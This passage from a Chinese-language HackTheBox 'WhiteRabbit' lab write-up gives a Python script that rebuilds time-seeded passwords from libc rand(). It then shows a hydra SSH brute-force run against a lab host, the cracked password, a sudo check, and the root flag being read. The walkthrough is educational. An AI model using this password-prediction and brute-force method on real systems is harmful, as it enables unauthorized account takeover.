* tv.tv_sec + tv.tv_usec / 1000</code> 是一个当前时间的 <strong>毫秒数</strong></li>\n</ul>\n<p>这个数值被作为种子或参数传入 <code>generate_password</code> 函数，可能用来生成基于时间的随机密码。</p>\n<p>而他生成密码时的时间是<code>2024-08-30 14:40:42</code> ，所以我们可以将该时间<code>/ 1000</code> 作为种子，生成一系列密码，其中一个密码就是正确的</p>\n</blockquote>\n<pre><code class=\"hljs language-bash\">import ctypes\nimport sys\n\n<span class=\"hljs-comment\"># 根据平台加载适当的C库。</span>\n<span class=\"hljs-keyword\">if</span> sys.platform.startswith(<span class=\"hljs-string\">'linux'</span>):\n    libc = ctypes.CDLL(<span class=\"hljs-string\">\"libc.so.6\"</span>)  <span class=\"hljs-comment\"># Linux平台</span>\n<span class=\"hljs-keyword\">elif</span> sys.platform == <span class=\"hljs-string\">\"darwin\"</span>:\n    libc = ctypes.CDLL(<span class=\"hljs-string\">\"libc.dylib\"</span>)  <span class=\"hljs-comment\"># macOS平台</span>\n<span class=\"hljs-keyword\">elif</span> sys.platform.startswith(<span class=\"hljs-string\">'win'</span>):\n    libc = ctypes.CDLL(<span class=\"hljs-string\">\"msvcrt.dll\"</span>)  <span class=\"hljs-comment\"># Windows平台</span>\n<span class=\"hljs-keyword\">else</span>:\n    raise Exception(<span class=\"hljs-string\">\"不支持的操作系统平台\"</span>)\n\ndef generate_password(seed):\n    charset = <span class=\"hljs-string\">\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"</span>  <span class=\"hljs-comment\"># 密码字符集</span>\n    <span class=\"hljs-comment\"># 使用C库的srand()设置种子</span>\n    libc.srand(seed)\n    password = []\n    <span class=\"hljs-keyword\">for</span> _ <span class=\"hljs-keyword\">in</span> range(20):\n        <span class=\"hljs-comment\"># 调用C库的rand()生成随机数</span>\n        r = libc.rand()\n        index = r % len(charset)  <span class=\"hljs-comment\"># 保证生成的索引在字符集长度范围内（62个字符）</span>\n        password.append(charset[index])  <span class=\"hljs-comment\"># 添加字符到密码列表</span>\n    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"\"</span>.<span class=\"hljs-built_in\">join</span>(password))  <span class=\"hljs-comment\"># 打印生成的密码</span>\n\ndef main():\n    <span class=\"hljs-comment\"># 2024-08-30 14:40:42 UTC的Unix时间戳</span>\n    base_time_sec = 1725028842\n    <span class=\"hljs-comment\"># 遍历该秒内的1000毫秒</span>\n    <span class=\"hljs-keyword\">for</span> ms <span class=\"hljs-keyword\">in</span> range(1000):\n        seed = base_time_sec * 1000 + ms  <span class=\"hljs-comment\"># 生成种子，包含毫秒部分</span>\n        generate_password(seed)  <span class=\"hljs-comment\"># 生成并打印密码</span>\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">'__main__'</span>:\n    main()  <span class=\"hljs-comment\"># 运行主函数</span>\n</code></pre>\n<p>使用后会生成密码字典，然后使用九头蛇爆破<code>neo</code>即可</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit  python get_pass.py > pass.txt                           \n ⚡ root@kali  ~/Desktop/test/whiterabbit  hydra -l neo -P pass.txt -Vv -t 12 10.10.11.63 ssh           \nHydra v9.5 (c) 2023 by van Hauser/THC &#x26; David Maciejak - Please <span class=\"hljs-keyword\">do</span> not use <span class=\"hljs-keyword\">in</span> military or secret service organizations, or <span class=\"hljs-keyword\">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n                                                                                                         \nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-07 07:16:27                   \n[WARNING] Many SSH configurations <span class=\"hljs-built_in\">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4\n[DATA] max 12 tasks per 1 server, overall 12 tasks, 1000 login tries (l:1/p:1000), ~84 tries per task\n[DATA] attacking ssh://10.10.11.63:22/                                                                   \n[VERBOSE] Resolving addresses ... [VERBOSE] resolving <span class=\"hljs-keyword\">done</span>                                           \n[INFO] Testing <span class=\"hljs-keyword\">if</span> password authentication is supported by ssh://neo@10.10.11.63:22                   \n[22][ssh] host: 10.10.11.63   login: neo   password: WBSxhWgfnMiclrV4dqfj                           \n[STATUS] attack finished <span class=\"hljs-keyword\">for</span> 10.10.11.63 (waiting <span class=\"hljs-keyword\">for</span> children to complete tests)                   \n1 of 1 target successfully completed, 1 valid password found                                        \n[WARNING] Writing restore file because 1 final worker threads did not complete <span class=\"hljs-keyword\">until</span> end.           \n[ERROR] 1 target did not resolve or could not be connected                                          \n[ERROR] 0 target did not complete                                                                        \nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-07 07:17:34    \n</code></pre>\n<p>得到密码<code>WBSxhWgfnMiclrV4dqfj</code></p>\n<p>所有权限（哭）</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/whiterabbit  ssh neo@10.10.11.63                                                                       \nneo@10.10.11.63<span class=\"hljs-string\">'s password: \nWelcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\nThis system has been minimized by removing packages and content that are\nnot required on a system that users do not log into.\n\nTo restore this content, you can run the '</span>unminimize<span class=\"hljs-string\">' command.\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Mon Apr 7 11:01:53 2025 from 10.10.16.14\nneo@whiterabbit:~$ sudo -l\n[sudo] password for neo: \nMatching Defaults entries for neo on whiterabbit:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser neo may run the following commands on whiterabbit:\n    (ALL : ALL) ALL\n</span></code></pre>\n<p>读取<code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">neo@whiterabbit:~$ <span class=\"hljs-built_in\">sudo</span> <span class=\"hljs-built_in\">cat</span> /root/root.txt\n19ffb49812c4ca4f8273aab4bd9dd5e9\n</code></pre>\n<h2>总结</h2>\n<p>难，入口找了好久。没提示真没注意到Json文件还藏着SQL注入的信息，但是注入的时间也太长了。最后还是逆向分析（不会），突然发现HTB 上的 Linux靶机，在Hard难度上的基本都是逆向。</p>","title":"HackTheBox - Season7-WhiteRabbit","date":"2025-04-07","updated":"2025-04-07","comments":true,"tags":["HackTheBox","Linux靶机","逆向分析","SQL注入","encrypt"],"categories":"靶机","isEncrypted":true}},"__N_SSG":true}